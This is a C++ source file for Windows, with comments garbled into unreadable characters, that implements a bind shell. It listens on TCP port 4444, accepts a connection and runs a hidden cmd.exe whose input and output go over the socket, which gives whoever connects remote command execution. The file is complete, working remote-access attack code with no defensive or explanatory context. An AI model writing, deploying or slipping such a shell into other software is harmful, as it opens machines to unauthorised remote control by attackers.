#define WIN32_LEAN_AND_MEAN

#include <iostream>
#include <string>
#include <thread>
#include <chrono>

#include <Windows.h>
#include <WinSock2.h>
#include <WS2tcpip.h>

#pragma comment(lib, "ws2_32")

struct Arg {
    wchar_t ipAddress[255] = L"127.0.0.1";
    wchar_t portStr[255] = L"4444";
} arg;


// �G���g���|�C���g
int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {

    // �|�[�g�ԍ��𕶎��񂩂�DWORD�ɕϊ�
    DWORD port = wcstoul(arg.portStr, nullptr, 10);

    // �\�P�b�g���C�u������������
    WSADATA socketData;
    WSAStartup(MAKEWORD(2, 2), &socketData);

    // �\�P�b�g�I�u�W�F�N�g���쐬 (TCP�\�P�b�g)
    SOCKET serverSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, nullptr, 0, 0);

    // �T�[�o�[�̃A�h���X�ݒ� (IP�A�h���X�A�|�[�g�ԍ�)
    struct sockaddr_in serverAddress;
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_port = htons(port);
    InetPton(AF_INET, arg.ipAddress, &serverAddress.sin_addr);

    // �o�C���h
    bind(serverSocket, reinterpret_cast<SOCKADDR*>(&serverAddress), sizeof(serverAddress));

    // �ڑ��̑ҋ@
    listen(serverSocket, 5);

    // �ڑ�������܂őҋ@
    SOCKET clientSocket = accept(serverSocket, nullptr, nullptr);
    if (clientSocket == INVALID_SOCKET) {
        return 1;
    }

    // �v���Z�X�\���̂̏�����
    STARTUPINFO si = {};
    PROCESS_INFORMATION pi = {};

    // ���o�͂��\�P�b�g�Ƀ��_�C���N�g
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = reinterpret_cast<HANDLE>(clientSocket);
    si.hStdOutput = reinterpret_cast<HANDLE>(clientSocket);
    si.hStdError = reinterpret_cast<HANDLE>(clientSocket);

    // ���_�C���N�g���ꂽ�X�g���[���ŃV�F�����N��
    wchar_t shell[255] = L"cmd.exe";
    CreateProcess(nullptr, shell, nullptr, nullptr, TRUE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);

    // �I����ҋ@���ă��\�[�X�����
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(clientSocket);
    closesocket(serverSocket);

    return 0;
}
